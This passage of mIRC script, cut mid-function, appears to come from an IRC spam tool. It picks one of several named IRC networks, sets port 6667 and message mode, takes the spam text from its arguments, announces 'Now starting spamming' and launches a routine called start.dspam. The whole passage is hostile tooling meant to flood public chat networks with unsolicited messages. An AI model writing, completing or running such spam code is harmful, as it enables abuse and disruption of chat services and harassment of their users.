  if (%xx == 2) { set %spam.server irc.newnet.net }
  if (%xx == 3) { set %spam.server irc.relic.net }
  if (%xx == 4) { set %spam.server irc.undernet.org }
  if (%xx == 5) { set %spam.server irc.infatech.net }
  if (%xx == 6) { set %spam.server irc.nitro.net }
  if (%xx == 7) { set %spam.server irc.zyclonicz.net }
  if (%xx == 8) { set %spam.server irc.criten.net }
  if (%xx == 9) { set %spam.server irc.webchat.org }
  if (%xx == 10) { set %spam.server irc.austnet.org }
  set %spam.port 6667
  set %spamtype MSG
  set %spam.msg $1-
  emsg $a Now starting spamming on %spam.server 6667 with spam: %spam.msg
  start.dspam
}
